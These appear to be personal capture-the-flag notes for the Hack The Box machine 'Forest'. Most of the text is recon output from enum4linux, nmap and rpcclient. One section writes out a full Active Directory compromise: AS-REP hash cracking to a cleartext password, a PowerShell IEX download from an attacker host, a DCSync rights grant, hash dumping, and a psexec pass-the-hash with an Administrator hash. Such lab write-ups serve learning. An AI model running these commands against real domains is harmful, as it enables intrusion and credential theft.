(null)<br />index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: (null)<br />index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: (null)<br />index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: (null)<br />index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: (null)<br />index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: (null)<br />index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: (null)<br />index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: (null)<br />index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: (null)<br />index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account<br />index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: (null)<br />index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: (null)<br />index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: (null)<br />index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: (null)<br />index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: (null)<br />index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)<br />index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: (null)<br />index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: (null)<br />index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: (null)<br />index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: (null)<br />index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: (null)<br />index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: (null)<br />index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: (null)<br />index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)<br /><br />user:[Administrator] rid:[0x1f4]<br />user:[Guest] rid:[0x1f5]<br />user:[krbtgt] rid:[0x1f6]<br />user:[DefaultAccount] rid:[0x1f7]<br />user:[$331000-VK4ADACQNUCA] rid:[0x463]<br />user:[SM_2c8eef0a09b545acb] rid:[0x464]<br />user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]<br />user:[SM_75a538d3025e4db9a] rid:[0x466]<br />user:[SM_681f53d4942840e18] rid:[0x467]<br />user:[SM_1b41c9286325456bb] rid:[0x468]<br />user:[SM_9b69f1b9d2cc45549] rid:[0x469]<br />user:[SM_7c96b981967141ebb] rid:[0x46a]<br />user:[SM_c75ee099d0a64c91b] rid:[0x46b]<br />user:[SM_1ffab36a2f5f479cb] rid:[0x46c]<br />user:[HealthMailboxc3d7722] rid:[0x46e]<br />user:[HealthMailboxfc9daad] rid:[0x46f]<br />user:[HealthMailboxc0a90c9] rid:[0x470]<br />user:[HealthMailbox670628e] rid:[0x471]<br />user:[HealthMailbox968e74d] rid:[0x472]<br />user:[HealthMailbox6ded678] rid:[0x473]<br />user:[HealthMailbox83d6781] rid:[0x474]<br />user:[HealthMailboxfd87238] rid:[0x475]<br />user:[HealthMailboxb01ac64] rid:[0x476]<br />user:[HealthMailbox7108a4e] rid:[0x477]<br />user:[HealthMailbox0659cc1] rid:[0x478]<br />user:[sebastien] rid:[0x479]<br />user:[lucinda] rid:[0x47a]<br />user:[svc-alfresco] rid:[0x47b]<br />user:[andy] rid:[0x47e]<br />user:[mark] rid:[0x47f]<br />user:[santi] rid:[0x480]<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.161    |<br /> ========================================= <br />WARNING: The &quot;syslog&quot; option is deprecated<br />smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.161]<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />Error returning browse list: NT_STATUS_REVISION_MISMATCH<br />Reconnecting with SMB1 for workgroup listing.<br />Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br />Failed to connect with SMB1 -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.161<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.161    |<br /> ==================================================== <br /><br /><br />[+] Attaching to 10.10.10.161 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] HTB<br />	[+] Builtin<br /><br />[+] Password Info for Domain: HTB<br /><br />	[+] Minimum password length: 7<br />	[+] Password history length: 24<br />	[+] Maximum password age: 41 days 23 hours 53 minutes <br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: 1 day 4 minutes <br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 7<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.161    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br />group:[Account Operators] rid:[0x224]<br />group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]<br />group:[Incoming Forest Trust Builders] rid:[0x22d]<br />group:[Windows Authorization Access Group] rid:[0x230]<br />group:[Terminal Server License Servers] rid:[0x231]<br />group:[Administrators] rid:[0x220]<br />group:[Users] rid:[0x221]<br />group:[Guests] rid:[0x222]<br />group:[Print Operators] rid:[0x226]<br />group:[Backup Operators] rid:[0x227]<br />group:[Replicator] rid:[0x228]<br />group:[Remote Desktop Users] rid:[0x22b]<br />group:[Network Configuration Operators] rid:[0x22c]<br />group:[Performance Monitor Users] rid:[0x22e]<br />group:[Performance Log Users] rid:[0x22f]<br />group:[Distributed COM Users] rid:[0x232]<br />group:[IIS_IUSRS] rid:[0x238]<br />group:[Cryptographic Operators] rid:[0x239]<br />group:[Event Log Readers] rid:[0x23d]<br />group:[Certificate Service DCOM Access] rid:[0x23e]<br />group:[RDS Remote Access Servers] rid:[0x23f]<br />group:[RDS Endpoint Servers] rid:[0x240]<br />group:[RDS Management Servers] rid:[0x241]<br />group:[Hyper-V Administrators] rid:[0x242]<br />group:[Access Control Assistance Operators] rid:[0x243]<br />group:[Remote Management Users] rid:[0x244]<br />group:[System Managed Accounts Group] rid:[0x245]<br />group:[Storage Replica Administrators] rid:[0x246]<br />group:[Server Operators] rid:[0x225]<br /><br />[+] Getting builtin group memberships:<br />Group &#39;Administrators&#39; (RID: 544) has member: Couldn&#39;t lookup SIDs<br />Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs<br />Group &#39;System Managed Accounts Group&#39; (RID: 581) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Account Operators&#39; (RID: 548) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs<br />Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs<br /><br />[+] Getting local groups:<br />group:[Cert Publishers] rid:[0x205]<br />group:[RAS and IAS Servers] rid:[0x229]<br />group:[Allowed RODC Password Replication Group] rid:[0x23b]<br />group:[Denied RODC Password Replication Group] rid:[0x23c]<br />group:[DnsAdmins] rid:[0x44d]<br /><br />[+] Getting local group memberships:<br />Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs<br /><br />[+] Getting domain groups:<br />group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]<br />group:[Domain Admins] rid:[0x200]<br />group:[Domain Users] rid:[0x201]<br />group:[Domain Guests] rid:[0x202]<br />group:[Domain Computers] rid:[0x203]<br />group:[Domain Controllers] rid:[0x204]<br />group:[Schema Admins] rid:[0x206]<br />group:[Enterprise Admins] rid:[0x207]<br />group:[Group Policy Creator Owners] rid:[0x208]<br />group:[Read-only Domain Controllers] rid:[0x209]<br />group:[Cloneable Domain Controllers] rid:[0x20a]<br />group:[Protected Users] rid:[0x20d]<br />group:[Key Admins] rid:[0x20e]<br />group:[Enterprise Key Admins] rid:[0x20f]<br />group:[DnsUpdateProxy] rid:[0x44e]<br />group:[Organization Management] rid:[0x450]<br />group:[Recipient Management] rid:[0x451]<br />group:[View-Only Organization Management] rid:[0x452]<br />group:[Public Folder Management] rid:[0x453]<br />group:[UM Management] rid:[0x454]<br />group:[Help Desk] rid:[0x455]<br />group:[Records Management] rid:[0x456]<br />group:[Discovery Management] rid:[0x457]<br />group:[Server Management] rid:[0x458]<br />group:[Delegated Setup] rid:[0x459]<br />group:[Hygiene Management] rid:[0x45a]<br />group:[Compliance Management] rid:[0x45b]<br />group:[Security Reader] rid:[0x45c]<br />group:[Security Administrator] rid:[0x45d]<br />group:[Exchange Servers] rid:[0x45e]<br />group:[Exchange Trusted Subsystem] rid:[0x45f]<br />group:[Managed Availability Servers] rid:[0x460]<br />group:[Exchange Windows Permissions] rid:[0x461]<br />group:[ExchangeLegacyInterop] rid:[0x462]<br />group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]<br />group:[Service Accounts] rid:[0x47c]<br />group:[Privileged IT Accounts] rid:[0x47d]<br />group:[test] rid:[0x13ed]<br /><br />[+] Getting domain group memberships:<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\Administrator<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\DefaultAccount<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\krbtgt<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\$331000-VK4ADACQNUCA<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_2c8eef0a09b545acb<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_75a538d3025e4db9a<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_681f53d4942840e18<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_1b41c9286325456bb<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_7c96b981967141ebb<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_c75ee099d0a64c91b<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailboxc3d7722<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailboxfc9daad<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailboxc0a90c9<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox670628e<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox968e74d<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox6ded678<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox83d6781<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailboxfd87238<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailboxb01ac64<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox7108a4e<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\HealthMailbox0659cc1<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\sebastien<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\lucinda<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\svc-alfresco<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\andy<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\mark<br />Group &#39;Domain Users&#39; (RID: 513) has member: HTB\santi<br />Group &#39;Exchange Servers&#39; (RID: 1118) has member: HTB\EXCH01$<br />Group &#39;Exchange Servers&#39; (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7<br />Group &#39;Privileged IT Accounts&#39; (RID: 1149) has member: HTB\Service Accounts<br />Group &#39;Exchange Trusted Subsystem&#39; (RID: 1119) has member: HTB\EXCH01$<br />Group &#39;Service Accounts&#39; (RID: 1148) has member: HTB\svc-alfresco<br />Group &#39;$D31000-NSEL5BRJ63V7&#39; (RID: 1133) has member: HTB\EXCH01$<br />Group &#39;Domain Computers&#39; (RID: 515) has member: HTB\EXCH01$<br />Group &#39;Exchange Windows Permissions&#39; (RID: 1121) has member: HTB\Exchange Trusted Subsystem<br />Group &#39;Domain Controllers&#39; (RID: 516) has member: HTB\FOREST$<br />Group &#39;Domain Admins&#39; (RID: 512) has member: HTB\Administrator<br />Group &#39;Organization Management&#39; (RID: 1104) has member: HTB\Administrator<br />Group &#39;Domain Guests&#39; (RID: 514) has member: HTB\Guest<br />Group &#39;Schema Admins&#39; (RID: 518) has member: HTB\Administrator<br />Group &#39;Enterprise Admins&#39; (RID: 519) has member: HTB\Administrator<br />Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: HTB\Administrator<br />Group &#39;Managed Availability Servers&#39; (RID: 1120) has member: HTB\EXCH01$<br />Group &#39;Managed Availability Servers&#39; (RID: 1120) has member: HTB\Exchange Servers<br /><br /> ======================================================================= <br />|    Users on 10.10.10.161 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.161    |<br /> ============================================= <br />Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Wed Oct 30 12:01:15 2019<br /></div><div class='page'><h1 class='title level-6'>nikto 5985</h1><br/>nikto -host <a href="http://10.10.10.161:5985">http://10.10.10.161:5985</a> | tee nikto_10.10.10.161:5985<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.161<br />+ Target Hostname:    10.10.10.161<br />+ Target Port:        5985<br />+ Start Time:         2019-10-30 12:53:16 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-HTTPAPI/2.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>sahres</h1><br/>root@kali:~/Desktop/Machines/HTB/Forest# nmap --script smb-enum-shares -p 139,445 10.10.10.161<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-30 12:54 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.094s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />| smb-enum-shares: <br />|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)<br />|   account_used: &lt;blank&gt;<br />|   \\10.10.10.161\ADMIN$: <br />|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED<br />|     Anonymous access: &lt;none&gt;<br />|   \\10.10.10.161\C$: <br />|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED<br />|     Anonymous access: &lt;none&gt;<br />|   \\10.10.10.161\IPC$: <br />|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED<br />|     Anonymous access: READ<br />|   \\10.10.10.161\NETLOGON: <br />|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED<br />|_    Anonymous access: &lt;none&gt;<br /><br />Nmap done: 1 IP address (1 host up) scanned in 233.61 seconds<br />root@kali:~/Desktop/Machines/HTB/Forest# <br /></div><div class='page'><h1 class='title level-7'>rpcclient</h1><br/>root@kali:~/Desktop/Machines/HTB/Forest# rpcclient -U &quot;&quot; -N 10.10.10.161<br />rpcclient $&gt; enumdomusers<br />user:[Administrator] rid:[0x1f4]<br />user:[Guest] rid:[0x1f5]<br />user:[krbtgt] rid:[0x1f6]<br />user:[DefaultAccount] rid:[0x1f7]<br />user:[$331000-VK4ADACQNUCA] rid:[0x463]<br />user:[SM_2c8eef0a09b545acb] rid:[0x464]<br />user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]<br />user:[SM_75a538d3025e4db9a] rid:[0x466]<br />user:[SM_681f53d4942840e18] rid:[0x467]<br />user:[SM_1b41c9286325456bb] rid:[0x468]<br />user:[SM_9b69f1b9d2cc45549] rid:[0x469]<br />user:[SM_7c96b981967141ebb] rid:[0x46a]<br />user:[SM_c75ee099d0a64c91b] rid:[0x46b]<br />user:[SM_1ffab36a2f5f479cb] rid:[0x46c]<br />user:[HealthMailboxc3d7722] rid:[0x46e]<br />user:[HealthMailboxfc9daad] rid:[0x46f]<br />user:[HealthMailboxc0a90c9] rid:[0x470]<br />user:[HealthMailbox670628e] rid:[0x471]<br />user:[HealthMailbox968e74d] rid:[0x472]<br />user:[HealthMailbox6ded678] rid:[0x473]<br />user:[HealthMailbox83d6781] rid:[0x474]<br />user:[HealthMailboxfd87238] rid:[0x475]<br />user:[HealthMailboxb01ac64] rid:[0x476]<br />user:[HealthMailbox7108a4e] rid:[0x477]<br />user:[HealthMailbox0659cc1] rid:[0x478]<br />user:[sebastien] rid:[0x479]<br />user:[lucinda] rid:[0x47a]<br />user:[svc-alfresco] rid:[0x47b]<br />user:[andy] rid:[0x47e]<br />user:[mark] rid:[0x47f]<br />user:[santi] rid:[0x480]<br /></div><div class='page'><h1 class='title level-4'>10.10.10.161 Forest2</h1><br/>nmap showed that an ass load of ports were open. SMB was the place to start<br />going through smb enumerations, GetNPUsers got me a hash for the user svc-alfresco<br />    GetNPUsers.py -dc-ip 10.10.10.161 -request &#39;htb.local/&#39; -format hashcat<br />I took that hash and cracked it with hashcat on my local box (and rockyou). s3rvice is the new creds!!<br />5985 (winrm) was open, and I was able to get a user shell with this!!<br /><br />From here I did all the Bloodhound things and found that I was able to add people to most groups and then add DACL&#39;s to those groups!!<br /><br />net user squidy YeeYeeYee /add /domain<br />net group “exchange trusted subsystem” /add svc-alfresco<br />logout<br />login       &lt;&lt; so that the group add takes affect<br />IEX(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8080/PV.ps1&#39;)      &lt;&lt;old powerview. #WhatAHeadache<br />add-domainobjectacl -TargetIdentity &quot;DC=htb,DC=local&quot; -rights dcsync -principalidentity squidy          &lt;&lt; to add the dacl allowing squidy to own the planet<br />secretsdump.py htb.local/squidy:YeeYeeYee@10.10.10.161          &lt;&lt; and now we have got the hashes for all including administrator!!<br /><br />psexec.py htb.local/administrator@10.10.10.161 -hashes ad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6<br />and we are nt authority\system<br />rooted!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>svc-alfresco s3rvice </div><div class='page'><h1 class='title level-6'>nmap short</h1><br/>ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 11:55 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.14s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap version</h1><br/>nmap -sC -sV 10.10.10.161<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 11:56 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.15s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE      VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-02 16:04:01Z)<br />135/tcp  open  msrpc        Microsoft Windows RPC<br />139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br />389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.80%I=7%D=4/2%Time=5E860B60%P=x86_64-pc-linux-gnu%r(DNSVe<br />SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x<br />SF:04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 2h26m45s, deviation: 4h02m30s, median: 6m45s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: FOREST<br />|   NetBIOS computer name: FOREST\x00<br />|   Domain name: htb.local<br />|   Forest name: htb.local<br />|   FQDN: FOREST.htb.local<br />|_  System time: 2020-04-02T09:06:24-07:00<br />| smb-security-mode: <br />|   account_used: &lt;blank&gt;<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-02T16:06:28<br />|_  start_date: 2020-04-01T15:58:13<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 327.76 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Forest$ <br /></div><div class='page'><h1 class='title level-6'>SmartNmap</h1><br/>nmap 10.10.10.161 &amp;&amp; nmap -sC -sV 10.10.10.161 &amp;&amp; nmap -p- 10.10.10.161<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 15:47 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.16s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 19.41 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 15:47 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.15s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE      VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-02 19:55:07Z)<br />135/tcp  open  msrpc        Microsoft Windows RPC<br />139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br />389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.80%I=7%D=4/2%Time=5E864188%P=x86_64-pc-linux-gnu%r(DNSVe<br />SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x<br />SF:04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 2h26m47s, deviation: 4h02m31s, median: 6m45s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: FOREST<br />|   NetBIOS computer name: FOREST\x00<br />|   Domain name: htb.local<br />|   Forest name: htb.local<br />|   FQDN: FOREST.htb.local<br />|_  System time: 2020-04-02T12:57:59-07:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-02T19:58:00<br />|_  start_date: 2020-04-01T15:58:13<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 335.65 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 15:53 EDT<br />Nmap scan report for 10.10.10.161<br />Host is up (0.20s latency).<br />Not shown: 65511 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />5985/tcp  open  wsman<br />9389/tcp  open  adws<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49669/tcp open  unknown<br />49676/tcp open  unknown<br />49677/tcp open  unknown<br />49684/tcp open  unknown<br />49706/tcp open  unknown<br />49910/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4096.65 seconds<br /></div><div class='page'><h1 class='title level-6'>dns</h1><br/>Nothing of value<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/>Andy hislip                                                                                   <br />administrator administrator<br />lucinda berger<br />mark brandt<br />omar null<br />santi rodriguez<br />sebastien caron<br />svc-alfresco svc-alfresco<br /></div><div class='page'><h1 class='title level-7'>enum4linux</h1><br/>enum4linux -a 10.10.10.161 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Thu Apr  2 11:57:00 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.161<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br 